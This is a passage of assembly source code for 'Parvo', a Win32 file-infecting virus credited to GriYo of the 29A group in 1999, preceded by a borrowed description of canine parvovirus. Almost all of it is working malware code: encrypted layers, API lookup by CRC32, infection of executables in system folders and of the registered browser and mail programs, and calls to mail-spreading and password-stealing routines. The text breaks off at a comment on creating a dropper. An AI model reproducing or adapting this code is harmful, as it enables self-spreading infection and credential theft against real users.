;----------------------------------------------------------------------------
;
;Parvo BioCoded by GriYo / 29A
;
;Win32 Tech Support by Jacky Qwerty / 29A
;
;Thanks to Darkman / 29A 
;and b0z0 / Ikx for their ideas and strategy
;
;Parvo is a research speciment, do not distribute
;
;©1999 29A Labs ... We create life
;
;----------------------------------------------------------------------------
;
;	About the biological version:
;	-----------------------------
;
;	Canine Parvovirus became known in the late 1970's. It is thought that it
;began as a mutation of the feline distemper virus.  Once it had surfaced it 
;caused  a widespread  epidemic  which resulted in thousands of deaths among 
;both wild and domestic canines.
;
;	Parvovirus is seen considerably  less  since vaccination for the disease
;became available but outbreaks do still occur.  Puppies between weaning age
;and  6  months  old are  the most susceptible to the virus.  The disease is 
;transmitted  when dogs come in contact with  the  bodily fluids of infected
;animals.
;
;	Parvovirus  is  characterized  by  severe, bloody diarrhea and vomiting,
;high fever and lethargy.  The diarrhea is particularly foul smelling and is
;sometimes yellow in color.  Parvo  can also attack  a  dog's  heart causing
;congestive heart failure. This complication can occur months or years after
;an apparent  recovery from the intestinal form of the disease.  Puppies who
;survive parvo  infection  usually remain somewhat un-healthy  and  weak for 
;life.
;
;	The surest way to avoid  parvo infection in your dog is to adhere to the
;recommended vaccination schedule which begins when puppies are 6-8 weeks of
;age. Puppies should not be allowed to socialize with other dogs or frequent
;areas where other  dogs  have been until 2 weeks after they have  had their
;last vaccination.  Immunization for parvo is usually included in your dog's
;distemper  vaccine.  This shot gives protection against several potentially
;fatal canine diseases all at the same time.
;
;	As there is no cure for any virus, treatment for parvo is mostly that of
;supporting  the  different  systems  in the  body  during the course of the
;disease.  This  includes  giving  fluids,  regulating  electrolyte  levels,
;controlling body temperature and giving blood transfusions when necessary.
;
;	The  virus  is  extremely hardy in  the  environment.  Withstanding wide
;temperature fluctuations and most cleaning agents.  Parvo  can  be  brought
;home to your dog on shoes, hands and even  car tires.  It can live for many
;months outside the animal.  Any areas that are thought  to be  contaminated
;with parvo should be thoroughly washed with chlorine bleach diluted 1 ounce
;per quart of water.
;
;	Canine Medical Information
;	by Dr. Cristine Welch
;
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
;Virus code
;----------------------------------------------------------------------------

                ;------------------------------------------------------------
                ;Compiler options
                ;------------------------------------------------------------

                .386P
                locals
                jumps
                .model flat,STDCALL

                ;------------------------------------------------------------
                ;29A viral include files (thanks again Jacky)
                ;------------------------------------------------------------

                include Win32api.inc
                include Useful.inc
                include Mz.inc
                include Pe.inc

                ;------------------------------------------------------------
                ;Just to show a message on virus 1st generation
                ;------------------------------------------------------------

				extrn ExitProcess:NEAR
				extrn ShellAboutA:NEAR

;----------------------------------------------------------------------------
;Fake host used for virus 1st generation
;----------------------------------------------------------------------------

_TEXT           segment dword use32 public 'CODE'

host_code:		jmp Skip1StGen

				push 00000000h
				push offset szAboutText
				push offset szAboutAppText
				push 00000000h
				call ShellAboutA

				push 00000000h
				call ExitProcess

Skip1StGen:		;First generation uses a NULL delta-offset

				xor ebp,ebp
				
				;We need the CRC32 lookup table
				
				call make_crc_tbl

				;Save the CRC32 of 'KERNEL32.DLL' inside virus body

				mov esi,offset g1_szKernel32
				call get_str_crc32
				mov dword ptr [CrcKernel32],edx

				;Save the CRC32 of 'GetProcAddress' inside virus body	

				mov esi,offset g1_szGetProcAddr
				call get_str_crc32
				mov dword ptr [CrcGetProcAddr],edx

				;Get CRC's of needed API's and save them inside virus body
				;Lets start with KERNEL32 API names

				mov ecx,NumK32Apis
				mov esi,offset namesK32Apis
				mov edi,offset CRC32K32Apis
				call save_crc_names

				;Now CRC's of WSOCK32 API names

				mov ecx,NumWS32Apis
				mov esi,offset namesWS32Apis
				mov edi,offset CRC32WS32Apis
				call save_crc_names

				;Now RASAPI32 API names

				mov ecx,NumRASApis
				mov esi,offset namesRASApis
				mov edi,offset CRC32RASApis
				call save_crc_names

				;And finally ADVAPI32 API names

				mov ecx,NumADApis
				mov esi,offset namesADApis
				mov edi,offset CRC32ADApis
				call save_crc_names

				;Get the CRC32 of filenames

				mov ecx,NumberOfAllow
				mov esi,offset namesAllow
				mov edi,offset filesAllow
				call save_crc_names

				;Execute virus for 1st time

				jmp CRC_protected

save_crc_names:	cld
get_g1_crc:		push ecx				
				lodsd
				push esi
				mov esi,eax
				call get_str_crc32
				mov eax,edx
				stosd
				pop esi
				pop ecx
				loop get_g1_crc
				ret

_TEXT           ends

;----------------------------------------------------------------------------
;Here comes the rest of the sections in virus 1st generation
;----------------------------------------------------------------------------

                ;------------------------------------------------------------
                ;Data section
                ;------------------------------------------------------------

_DATA           segment dword use32 public 'DATA'

szAboutText		db 'ParvoVirus BioCoded by GriYo / 29A',00h
szAboutAppText	db 'ParvoVirus Launch Program#ParvoVirosis',00h

                ;------------------------------------------------------------

g1_szKernel32		db 'KERNEL32.DLL',00h
g1_szGetProcAddr	db 'GetProcAddress',00h

                ;------------------------------------------------------------

namesK32Apis	equ $

				dd offset g1_CreateFileA					
				dd offset g1_CreateFileMappingA			
				dd offset g1_MapViewOfFile				
				dd offset g1_UnmapViewOfFile				
				dd offset g1_CloseHandle					
				dd offset g1_FindFirstFileA				
				dd offset g1_FindNextFileA				
				dd offset g1_FindClose					
				dd offset g1_VirtualAlloc					
				dd offset g1_GetWindowsDirectoryA			
				dd offset g1_GetSystemDirectoryA			
				dd offset g1_GetCurrentDirectoryA			
				dd offset g1_SetFileAttributesA			
				dd offset g1_GetFileAttributesA
				dd offset g1_SetFileTime					
				dd offset g1_DeleteFileA					
				dd offset g1_GetCurrentProcess			
				dd offset g1_WriteProcessMemory			
				dd offset g1_LoadLibraryA
				dd offset g1_FreeLibrary
				dd offset g1_GetSystemTime				
				dd offset g1_SetFilePointer				
				dd offset g1_SetEndOfFile					
				dd offset g1_MoveFileA					
				dd offset g1_ExitProcess
				dd offset g1_GetVersionExA
				dd offset g1_GetModuleFileNameA
				dd offset g1_CopyFileA
				dd offset g1_GetFileTime
				dd offset g1_CreateSemaphoreA
				dd offset g1_ReleaseSemaphore
				dd offset g1_CreateProcessA
				dd offset g1_WaitForSingleObject
				dd offset g1_GetCommandLineA
				dd offset g1_WriteFile
				dd offset g1_GetTempPathA

                ;------------------------------------------------------------

namesWS32Apis	equ $

				dd offset g1_WSAStartup 
				dd offset g1_inet_addr
				dd offset g1_gethostbyaddr
				dd offset g1_htons
				dd offset g1_socket
				dd offset g1_connect
				dd offset g1_send
				dd offset g1_recv
				dd offset g1_closesocket
				dd offset g1_WSACleanup

                ;------------------------------------------------------------

namesRASApis	equ $

				dd offset g1_RasEnumConnectionsA
				dd offset g1_RasEnumEntriesA
				dd offset g1_RasGetEntryDialParamsA

                ;------------------------------------------------------------

namesADApis		equ $

				dd offset g1_RegOpenKeyA
				dd offset g1_RegQueryValueA
				dd offset g1_RegCloseKey

                ;------------------------------------------------------------

g1_CreateFileA					db 'CreateFileA',00h
g1_CreateFileMappingA			db 'CreateFileMappingA',00h
g1_MapViewOfFile				db 'MapViewOfFile',00h
g1_UnmapViewOfFile				db 'UnmapViewOfFile',00h
g1_CloseHandle					db 'CloseHandle',00h
g1_FindFirstFileA				db 'FindFirstFileA',00h
g1_FindNextFileA				db 'FindNextFileA',00h
g1_FindClose					db 'FindClose',00h
g1_VirtualAlloc					db 'VirtualAlloc',00h
g1_GetWindowsDirectoryA			db 'GetWindowsDirectoryA',00h
g1_GetSystemDirectoryA			db 'GetSystemDirectoryA',00h
g1_GetCurrentDirectoryA			db 'GetCurrentDirectoryA',00h
g1_SetFileAttributesA			db 'SetFileAttributesA',00h
g1_GetFileAttributesA			db 'GetFileAttributesA',00h
g1_SetFileTime					db 'SetFileTime',00h
g1_DeleteFileA					db 'DeleteFileA',00h
g1_GetCurrentProcess			db 'GetCurrentProcess',00h
g1_WriteProcessMemory			db 'WriteProcessMemory',00h
g1_LoadLibraryA					db 'LoadLibraryA',00h
g1_FreeLibrary					db 'FreeLibrary',00h
g1_GetSystemTime				db 'GetSystemTime',00h
g1_SetFilePointer				db 'SetFilePointer',00h
g1_SetEndOfFile					db 'SetEndOfFile',00h
g1_MoveFileA					db 'MoveFileA',00h
g1_ExitProcess					db 'ExitProcess',00h
g1_GetVersionExA				db 'GetVersionExA',00h
g1_GetModuleFileNameA			db 'GetModuleFileNameA',00h
g1_CopyFileA					db 'CopyFileA',00h
g1_GetFileTime					db 'GetFileTime',00h
g1_CreateSemaphoreA				db 'CreateSemaphoreA',00h
g1_ReleaseSemaphore				db 'ReleaseSemaphore',00h
g1_CreateProcessA				db 'CreateProcessA',00h
g1_WaitForSingleObject			db 'WaitForSingleObject',00h
g1_GetCommandLineA				db 'GetCommandLineA',00h
g1_WriteFile					db 'WriteFile',00h
g1_GetTempPathA					db 'GetTempPathA',00h

                ;------------------------------------------------------------

g1_WSAStartup					db 'WSAStartup',00h
g1_inet_addr					db 'inet_addr',00h
g1_gethostbyaddr				db 'gethostbyaddr',00h
g1_htons						db 'htons',00h
g1_socket						db 'socket',00h
g1_connect						db 'connect',00h
g1_send							db 'send',00h
g1_recv							db 'recv',00h
g1_closesocket					db 'closesocket',00h
g1_WSACleanup					db 'WSACleanup',00h

                ;------------------------------------------------------------

g1_RasEnumConnectionsA			db 'RasEnumConnectionsA',00h
g1_RasEnumEntriesA				db 'RasEnumEntriesA',00h
g1_RasGetEntryDialParamsA		db 'RasGetEntryDialParamsA',00h

                ;------------------------------------------------------------

g1_RegOpenKeyA					db 'RegOpenKeyA',00h
g1_RegQueryValueA				db 'RegQueryValueA',00h
g1_RegCloseKey					db 'RegCloseKey',00h

                ;------------------------------------------------------------

g1_file_00		db 'CUTFTP32.EXE',00h
g1_file_01		db 'IEXPLORE.EXE',00h
g1_file_02		db 'INSTALL.EXE',00h
g1_file_03		db 'INSTALAR.EXE',00h
g1_file_04		db 'MSIMN.EXE',00h
g1_file_05		db 'NETSCAPE.EXE',00h
g1_file_06		db 'NOTEPAD.EXE',00h
g1_file_07		db 'NTBACKUP.EXE',00h
g1_file_08		db 'ORDER.EXE',00h
g1_file_09		db 'RASMON.EXE',00h
g1_file_0A		db 'SETUP.EXE',00h
g1_file_0B		db 'TELNET.EXE',00h
g1_file_0C		db 'WAB.EXE',00h
g1_file_0D		db 'WABMIG.EXE',00h
g1_file_0E		db 'WINZIP32.EXE',00h

namesAllow		equ $

				dd offset g1_file_00
				dd offset g1_file_01
				dd offset g1_file_02
				dd offset g1_file_03
				dd offset g1_file_04
				dd offset g1_file_05
				dd offset g1_file_06
				dd offset g1_file_07
				dd offset g1_file_08
				dd offset g1_file_09
				dd offset g1_file_0A
				dd offset g1_file_0B
				dd offset g1_file_0C
				dd offset g1_file_0D
				dd offset g1_file_0E

NumberOfAllow	equ ($-namesAllow)/04h

_DATA           ends

                ;------------------------------------------------------------
                ;BSS section
                ;------------------------------------------------------------

_BSS            segment dword use32 public 'BSS'

_BSS            ends

                ;------------------------------------------------------------
                ;Virus section
                ;------------------------------------------------------------

virseg          segment dword use32 public 'PARVO'

;----------------------------------------------------------------------------
;Virus entry point
;----------------------------------------------------------------------------

viro_sys:		;Get virus delta offset

				call get_delta
get_delta:		pop ebp
				sub ebp,offset get_delta

				;Decrypt 2nd layer

				mov edx,esp
				mov ecx,inf_size-SizeOf2nd
				lea esp,dword ptr [ebp+Inside2ndLayer]
second_layer:	pop eax
				rol al,04h
				push eax
				inc esp
				loop second_layer
				mov esp,edx

				jmp Inside2ndLayer

SizeOf2nd		equ $-viro_sys

Inside2ndLayer:	;Generate a CRC32 lookup table

				call make_crc_tbl

				;Check CRC32 of main virus body
				;
				; esi -> Ptr to buffer
				; ecx -> Buffer size

				mov ecx,SizeOfProtect
				lea esi,dword ptr [ebp+CRC_protected]
				call get_crc32

				;Checksum matches?

				db 0B8h
ViralChecksum	dd 00000000h
				cmp eax,edx
				jne init_error

CRC_protected:	;Scan system memory looking for KERNEL32.DLL

                pushad

fK32_try_01:	mov eax,080000101h
                call IGetNtBaseAddr
                jecxz fK32_try_02
                jmp short kernel_found
fK32_try_02:    mov eax,0C0000101h
                call IGetNtBaseAddr
                jecxz fK32_try_03
                jmp short kernel_found
fK32_try_03:    xor eax,eax
                call IGetNtBaseAddr

kernel_found:   mov dword ptr [esp.Pushad_ebx],ecx
                popad
                or ebx,ebx
                jz init_error

				;Get entry-point of GetProcAddress

				call GetGetProcAddr				
				mov dword ptr [ebp+a_GetProcAddress],eax

				;Get KERNEL32 API addresses

				mov ecx,NumK32Apis				
				lea esi,dword ptr [ebp+CRC32K32Apis]
				lea edi,dword ptr [ebp+epK32Apis]
				call get_APIs
				jecxz API_sucksexee

init_error:		;Execution reach this point whenever initialization fails
				;At this point we cant use KERNEL32 API's to execute the
				;host... So lets try to terminate current process using
				;a simple RET instruction (it works, belive me)

				ret

API_sucksexee:	;Now we can call KERNEL32 API's!!!!

				;Lets allocate some memory for the virus

                push PAGE_EXECUTE_READWRITE
                push MEM_RESERVE or MEM_COMMIT
                push alloc_size
                push 00000000h
                call dword ptr [ebp+a_VirtualAlloc]
				or eax,eax
                jz Fail2Signal

                ;Copy virus to allocated memory

                lea esi,dword ptr [ebp+viro_sys]
                mov edi,eax
                mov ecx,size_virtual
                cld
                rep movsb

				;Continue execution on virus copy

				add eax,offset go_mem - offset viro_sys
				push eax
				ret

;----------------------------------------------------------------------------
;End of virus critical initialization
;----------------------------------------------------------------------------

go_mem:			;Get delta offset for allocated memory

				call get_mem_delta
get_mem_delta:	pop ebp
				sub ebp,offset get_mem_delta

viral_exec_end:	;Make a random named copy of the infected file and
				;clean it	

				push MAX_PATH
				lea esi,dword ptr [ebp+BufStr2Upper]
				push esi
				push 00000000h
				call dword ptr [ebp+a_GetModuleFileNameA]
				or eax,eax
				jz Fail2Signal

				push TRUE
				lea edi,dword ptr [ebp+BufStrFilename]
				push edi
				push esi
				call parse_filename
				mov edi,edx
				call rnd_exefile
				call dword ptr [ebp+a_CopyFileA]
				or eax,eax
				jz viral_exec_end

				;Set file attributes

                push FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
				lea eax,dword ptr [ebp+BufStrFilename]
				push eax
                call dword ptr [ebp+a_SetFileAttributesA]

				lea esi,dword ptr [ebp+BufStrFilename]
				lea edi,dword ptr [ebp+BufDeleteOnExit]
				call parse_filename

				mov edi,dword ptr [ebp+OrgSize]
				call OpenMapFile
				or eax,eax
				jz Fail2Signal
				mov ebx,eax

				;Restore code at host entry-point

				call get_code_sh
				jecxz Fail2Signal
				
				; ebx -> Base address
				; ecx -> Pointer to RAW
				; edx -> Entry-point RVA
				; esi -> Pointer to IMAGE_OPTIONAL_HEADER
				; edi -> Pointer to section header

				lea esi,dword ptr [ebp+OrgEPCode]
				mov edi,dword ptr [ebp+SizeOfModCode]
				xchg ecx,edi
				rep movsb

				;Restore OH_SizeOfImage

				call get_last_sh

				; esi -> IMAGE_OPTIONAL_HEADER
				; edi -> Pointer to last section header                

				mov eax,dword ptr [ebp+OrgSizeOfImg]
				or eax,eax
				jz is_1st_gen
				mov dword ptr [esi+OH_SizeOfImage],eax

				;Restore last section header

				lea esi,dword ptr [ebp+OrgSH]
				mov ecx,IMAGE_SIZEOF_SECTION_HEADER
				rep movsb

is_1st_gen:		mov ecx,dword ptr [ebp+OrgSize]
				call UnmapClose
				call HandleClose

				;Execute the result application

				xor eax,eax
				mov ecx,SIZEOF_PI
				lea edi,dword ptr [ebp+Process_Info]
				push edi
				cld
				rep stosb
				mov eax,SIZEOF_SI
				mov ecx,eax
				dec ecx
				push edi
				stosd
				xor eax,eax
				rep stosd
				push ecx
				push ecx
				push 00000200h	;CREATE_NEW_PROCESS_GROUP
				push ecx
				push ecx
				push ecx
				call dword ptr [ebp+a_GetCommandLineA]
				push eax
				lea eax,dword ptr [ebp+BufStrFilename]
				push eax
				call dword ptr [ebp+a_CreateProcessA]
				or eax,eax
				jz Fail2Signal

				;The host is being executed now... So we can call
				;blocking services without blocking the host execution

				;Lets use a semaphore to check if another instance
				;of the virus is already running
				;A semaphore is a named object that can be referenced
				;from several processes, increasing its initial counter
				;value via the ReleaseSemaphore API

				lea eax,dword ptr [ebp+szSemaphoreName]
				push eax
				mov eax,00000001h
				push eax
				dec eax
				push eax
				push eax								
				call dword ptr [ebp+a_CreateSemaphoreA]
				or eax,eax
				jz Fail2Signal
				mov dword ptr [ebp+h_Semaphore],eax

				;Increment the semaphore value in one (max. count)
				;In this way the following call will fail if another copy
				;of the virus is already running

				xor edx,edx
				push edx
				inc edx
				push edx
				push eax
				call dword ptr [ebp+a_ReleaseSemaphore]
				or eax,eax
				jz unknown_ver

				;There are no other instances of the virus running!!!!				

				;Get and save Windows version

				mov dword ptr [ebp+OSVerInfoSize],SizeOfOsVersion
				lea eax,dword ptr [ebp+OsVersionInfo]
				push eax
				call dword ptr [ebp+a_GetVersionExA]
				or eax,eax
				jz unknown_ver

				;Generate polymophic decryptor
				
				call mutate_virus
				
				;infect files

				call search_files

				;Virus mail spreading routines

				call share_the_fun

				;Execute password stealing routines????

				call get_rnd32
				test al,01h
				jz unknown_ver
				call steal_passwd

unknown_ver:	;Wait until disinfected host terminates

				push 0FFFFFFFFh
				mov eax,dword ptr [ebp+PI_hProcess]
				push eax
				call dword ptr [ebp+a_WaitForSingleObject]

				;Delete disinfected file

				lea eax,dword ptr [ebp+BufDeleteOnExit]
				push eax
				call dword ptr [ebp+a_DeleteFileA]

				;Free semaphore

				push dword ptr [ebp+h_Semaphore]
				call dword ptr [ebp+a_CloseHandle]

Fail2Signal:	;Terminate infect process

                push 00000000h
                call dword ptr [ebp+a_ExitProcess]

;----------------------------------------------------------------------------
;Search for target files in current, windows and system directories
;----------------------------------------------------------------------------

search_files:	;Load ADVAPI32.DLL so we can mess with the registry

				call AD_Init
				jc err_inet_tools

				;Infect executable used to open .HTML files

				lea edx,dword ptr [ebp+key_html]
				call infect_assoc
				
				;Infect executable used to send mail

				lea edx,dword ptr [ebp+key_mailto]
				call infect_assoc

				;We no longer need ADVAPI32.DLL

				call FreeADDll

err_inet_tools:	;Try to infect files in current directory

                lea eax,dword ptr [ebp+BufGetDir]
                push eax
                push MAX_PATH
                call dword ptr [ebp+a_GetCurrentDirectoryA]
                or eax,eax
                jz try_windir
                call do_in_dir
                
try_windir:     ;Try to infect files in \WINDOWS directory

                push MAX_PATH
                lea eax,dword ptr [ebp+BufGetDir]
                push eax
                call dword ptr [ebp+a_GetWindowsDirectoryA]
                or eax,eax
                jz try_sysdir
                call do_in_dir

try_sysdir:     ;Try to infect files in \SYSTEM directory

                push MAX_PATH
                lea eax,dword ptr [ebp+BufGetDir]
                push eax
                call dword ptr [ebp+a_GetSystemDirectoryA]
                or eax,eax
                jz exit_in_dir

;----------------------------------------------------------------------------
;Search for files to infect in the specifyed directory
;----------------------------------------------------------------------------

do_in_dir:		;Trying to infect files in root directory?				

                cmp eax,00000004h
                jb exit_in_dir				

dir_complete:   lea edx,dword ptr [ebp+DirectFindData]
                push edx                
                lea edi,dword ptr [ebp+BufGetDir]
				push edi

                ;Insert *.* next to path

				xor al,al
                cld
direct_Null:	scasb
				jnz direct_Null
				mov byte ptr [edi-00000001h],"\"

				;This is '*.EXE',00h

				mov eax,'XE.*'
				stosd
				mov ax,0045h
				stosw

				;First find try

				call dword ptr [ebp+a_FindFirstFileA]
                cmp eax,INVALID_HANDLE_VALUE
                je exit_in_dir
				mov dword ptr [ebp+h_Find],eax

work_with_WFD:	;Skip directories, compressed and system files

				mov eax,dword ptr [ebp+										\
								   DirectFindData+							\
								   WFD_dwFileAttributes]

				and eax,FILE_ATTRIBUTE_DIRECTORY  or						\
						FILE_ATTRIBUTE_COMPRESSED or						\
						FILE_ATTRIBUTE_SYSTEM

				jnz DirectAgain

				;Check if file size is allowed

				cld
				lea esi,dword ptr [ebp+										\
								   DirectFindData+							\
								   WFD_nFileSizeHigh]
				lodsd
				or eax,eax
                jnz DirectAgain
				lodsd
				cmp eax,0FFFFFFFFh-size_virtual
				jae DirectAgain				
				mov dword ptr [ebp+OrgSize],eax
				
				;Check if file is already infected

                mov ecx,size_padding
                xor edx,edx
                div ecx
                or edx,edx
                jz DirectAgain

				;Get complete path+filename and convert it to upper case

				lea esi,dword ptr [ebp+BufGetDir]
				lea edi,dword ptr [ebp+BufStr2Upper]
				call parse_filename
				lea esi,dword ptr [ebp+										\
								   DirectFindData+							\
								   WFD_szFileName]
				mov edi,edx
				push edi
				call parse_filename

				;Check if filename is allowed

				pop esi
				call get_str_crc32
				lea esi,dword ptr [ebp+filesAllow]
				mov ecx,NumberOfAllow
crc_allow:		lodsd
				cmp eax,edx
				je allow_filename
				loop crc_allow

				jmp DirectAgain

allow_filename:	;Generate a string with file path, but this time
				;use a different filename without executable
				;extension
								
try_rename_it:	lea edi,dword ptr [ebp+BufStrFilename]
				push edi
				lea esi,dword ptr [ebp+BufStr2Upper]
				push esi
				call parse_filename
				mov edi,edx
				call rnd_filename
						
				;Rename file to a non-executable extension

				call dword ptr [ebp+a_MoveFileA]
				or eax,eax
				jz try_rename_it

				;Try to infect this file

				call infect_file

				;Restore original file name

				lea esi,dword ptr [ebp+BufStrFilename]
				lea edi,dword ptr [ebp+BufStr2Upper]
				call parse_filename
				lea esi,dword ptr [ebp+										\
								   DirectFindData+							\
								   WFD_szFileName]

				;We dont use here the parse_filename rotuine because we want
				;to respect the upper and lowers case

				mov edi,edx
				cld
ParseNoUpper:	lodsb
				stosb
				or al,al
				jnz ParseNoUpper

				lea eax,dword ptr [ebp+BufStr2Upper]
				push eax
				lea eax,dword ptr [ebp+BufStrFilename]
				push eax
				call dword ptr [ebp+a_MoveFileA]

DirectAgain:	;More files, please

				lea eax,dword ptr [ebp+DirectFindData]
				push eax
                push dword ptr [ebp+h_Find]
				call dword ptr [ebp+a_FindNextFileA]
                or eax,eax
                jnz work_with_WFD

				;Close Win32 find handle

                push dword ptr [ebp+h_Find]
                call dword ptr [ebp+a_FindClose]

exit_in_dir:	ret

;----------------------------------------------------------------------------
;Infect program associated with a document
;
;On entry:
;				edx -> Ptr to key name
;----------------------------------------------------------------------------

infect_assoc:	lea edi,dword ptr [ebp+h_RegKey]
				push edi
				push edx
				push 80000002h ;HKEY_LOCAL_MACHINE
				call dword ptr [ebp+a_RegOpenKeyA]
				or eax,eax
				jnz err_OpenKey
				lea edx,dword ptr [ebp+key_size]
				mov dword ptr [edx],MAX_PATH
				push edx
				lea esi,dword ptr [ebp+BufGetDir-00000001h]
				push esi
				push eax
				push dword ptr [edi]
				call dword ptr [ebp+a_RegQueryValueA]
				or eax,eax
				jnz err_QueryVal
				cmp byte ptr [esi],22h
				jne err_QueryVal
				push edi
				mov ecx,MAX_PATH
				mov edx,esi
				cld
iexplore_name:	lodsb
				cmp al,'\'
				jne iexplore_slash
				mov edx,esi
iexplore_slash:	or al,al
				je got_ie_path
				loop iexplore_name
				jmp QueryValPop

got_ie_path:	mov byte ptr [edx-00000001h],al
				call dir_complete
QueryValPop:	pop edi
err_QueryVal:	push dword ptr [edi]
				call dword ptr [ebp+a_RegCloseKey]

err_OpenKey:	ret

;----------------------------------------------------------------------------
;Infect file routines
;
;On entry:
;				BufStrFilename -> Buffer filled with path + filename
;				OrgSize		   -> Contains clean file size
;----------------------------------------------------------------------------

infect_file:	mov eax,dword ptr [ebp+OrgSize]
				add eax,inf_size
				add eax,dword ptr [ebp+decryptor_size]
                mov ecx,size_padding
                xor edx,edx
                div ecx
                inc eax
                mul ecx
				mov edi,eax
				call OpenMapFile
				or eax,eax
				jz inf_file_err
				
				mov ebx,eax

                ;Check for MZ signature at base address

                cld
                cmp word ptr [ebx],IMAGE_DOS_SIGNATURE
                jne inf_close_file

                ;Check file address of relocation table

                cmp word ptr [ebx+MZ_lfarlc],0040h
                jb inf_close_file

                ;Now go to the pe header and check for the PE signature

                mov esi,dword ptr [ebx+MZ_lfanew]
                add esi,ebx
                lodsd
                cmp eax,IMAGE_NT_SIGNATURE
                jne inf_close_file

                ;Check machine field in IMAGE_FILE_HEADER
                ;just allow i386 PE files

                cmp word ptr [esi+FH_Machine],IMAGE_FILE_MACHINE_I386
                jne inf_close_file

                ;Now check the characteristics, look if file
                ;is an executable

                mov ax,word ptr [esi+FH_Characteristics]
                test ax,IMAGE_FILE_EXECUTABLE_IMAGE
                jz inf_close_file

                ;Avoid DLL's

                test ax,IMAGE_FILE_DLL
                jnz inf_close_file

				;Infect only GUI applications
				
				cmp word ptr [esi+											\
							  IMAGE_SIZEOF_FILE_HEADER+						\
							  OH_Subsystem],IMAGE_SUBSYSTEM_WINDOWS_GUI
							  		
				jne inf_close_file
				     
				;Do not infect files with shared flag on last section
				
				call get_last_sh
                test dword ptr [edi+SH_Characteristics],IMAGE_SCN_MEM_SHARED
                jnz inf_close_file

				;Lets go to section header and see whats there...

				call get_code_sh
				jecxz inf_close_file

				; ebx -> Base address
                ; ecx -> Pointer to RAW data or NULL if error
                ; edx -> Entry-point RVA
                ; esi -> Pointer to IMAGE_OPTIONAL_HEADER
                ; edi -> Pointer to section header				

				;Avoid files with SHARED code section

                test dword ptr [edi+SH_Characteristics],IMAGE_SCN_MEM_SHARED
                jnz inf_close_file

				;Check for relocations

				mov dword ptr [ebp+SizeOfModCode],ep_junk_size
                mov edx,dword ptr [esi+										\
								   OH_DataDirectory+						\
                                   DE_BaseReloc+							\
                                   DD_VirtualAddress]
                or edx,edx
				jz no_fear_relocs

				;Check if there is enough space without relocations at file 
				;entry-point

                call RVA2RAW
                mov edi,esi
                mov esi,ecx

                ; edx -> Relocations section delta offset
                ; esi -> Pointer to RAW data about relocations
                ; edi -> Pointer to IMAGE_OPTIONAL_HEADER
                
do_reloc:		;Get IBR_VirtualAddress
                
                lodsd
                mov edx,eax             

                ;Get IBR_SizeOfBlock

                lodsd                   
                or eax,eax
                jz no_fear_relocs

continue_reloc: ;Get number of relocations in this block
                                                        
                sub eax,IMAGE_SIZEOF_BASE_RELOCATION
                shr eax,01h
                mov ecx,eax

rblock_loop:    ;Get IBR_TypeOffset

                xor eax,eax
                lodsw
                and ax,0FFFh
                add eax,edx

				; eax -> RVA relocation apply address

                sub eax,dword ptr [edi+OH_AddressOfEntryPoint]
                jns reloc_over_ep

next_reloc:     ;Follow relocations chain

                loop rblock_loop
                jmp short do_reloc

reloc_over_ep:  ;Get number of bytes from entry-point to first relocation
				;Check if there enough space without relocations

				cmp eax,ep_junk_size
				jae no_fear_relocs

				;There is space for a single jmp instruction?

				mov ecx,00000005h
				cmp eax,ecx
				jb inf_close_file

				mov dword ptr [ebp+SizeOfModCode],ecx

no_fear_relocs:	;Copy code at host entry-point to our buffer

				call get_code_sh
				mov esi,dword ptr [ebp+SizeOfModCode]
				xchg ecx,esi
                lea edi,dword ptr [ebp+OrgEPCode]
				push esi
				push ecx
				rep movsb

				;Write a jump to virus code at the end of polymorphic junk

				mov edi,dword ptr [ebp+ep_junk_fix]
                mov al,0E9h
                stosb
				push edi
                call get_last_sh

                ; esi -> IMAGE_OPTIONAL_HEADER
                ; edi -> Pointer to last section header

				mov eax,dword ptr [ebp+OrgSize]				;Original size
                sub eax,dword ptr [edi+SH_PointerToRawData]	;Convert to RVA
                add eax,dword ptr [edi+SH_VirtualAddress]
				add eax,inf_size							;add virus size
				add eax,dword ptr [ebp+entry_point]			;add poly ep
				sub eax,dword ptr [esi+OH_AddressOfEntryPoint] ;sub host ep
				
				; eax -> Distance from file entry point to poly entry point

				pop edi
				pop ecx
				cmp ecx,00000005h
				ja include_junk
				mov esi,dword ptr [ebp+ep_junk_fix]
				jmp short recicled_code

include_junk:	sub eax,dword ptr [ebp+ep_junk_fix]
				add eax,dword ptr [ebp+ep_junk_addr]				
				mov esi,dword ptr [ebp+ep_junk_addr]

recicled_code:	; eax -> Distance from the jmp to poly entry point

				sub eax,00000005h
				stosd
				pop edi
				rep movsb				

				;Move virus to file and apply encryption

                mov eax,dword ptr [ebp+OrgSize]
				lea edi,dword ptr [eax+ebx]
				call ViralAttach

				;Modify last section

                call get_last_sh

                ;esi -> IMAGE_OPTIONAL_HEADER
                ;edi -> Pointer to last section header

				;Set read/write access on last section

				or dword ptr [edi+SH_Characteristics],						\
						 IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE

                ;Get new VirtualSize

				mov eax,dword ptr [ebp+OrgSize]
				add eax,dword ptr [ebp+decryptor_size]
				sub eax,dword ptr [edi+SH_PointerToRawData]
				push eax
				add eax,size_virtual
				cmp eax,dword ptr [edi+SH_VirtualSize]
				jbe ok_VirtualSize
                mov dword ptr [edi+SH_VirtualSize],eax

                ;Update OH_SizeOfImage				

ok_VirtualSize:	add eax,dword ptr [edi+SH_VirtualAddress]
				xor edx,edx
                mov ecx,dword ptr [esi+OH_SectionAlignment]                
                div ecx
                inc eax
                mul ecx				
				cmp eax,dword ptr [esi+OH_SizeOfImage]
				jbe ok_SizeOfImage
				mov dword ptr [esi+OH_SizeOfImage],eax

ok_SizeOfImage:	;Get new SizeOfRawData

				pop eax
				add eax,inf_size
				
				;****
				;Problem with rounded up size
				;
				;xor edx,edx
                ;mov ecx,dword ptr [esi+OH_FileAlignment]                				
                ;div ecx
                ;inc eax
                ;mul ecx
                
				mov dword ptr [edi+SH_SizeOfRawData],eax

				;Infection sucksexee!!!!

				call UnmapClose
				call HandleClose
				ret

inf_close_file:	call UnmapClose

				;Restore file size

				xor eax,eax
				push eax
				push eax
				push dword ptr [ebp+OrgSize]
				mov esi,dword ptr [ebp+h_CreateFile]
				push esi
				call dword ptr [ebp+a_SetFilePointer]
				cmp eax,0FFFFFFFFh
				je cant_resize
				push esi
				call dword ptr [ebp+a_SetEndOfFile]
cant_resize:	call HandleClose

inf_file_err:	ret

;----------------------------------------------------------------------------
;Create dropper
;
;On exit:
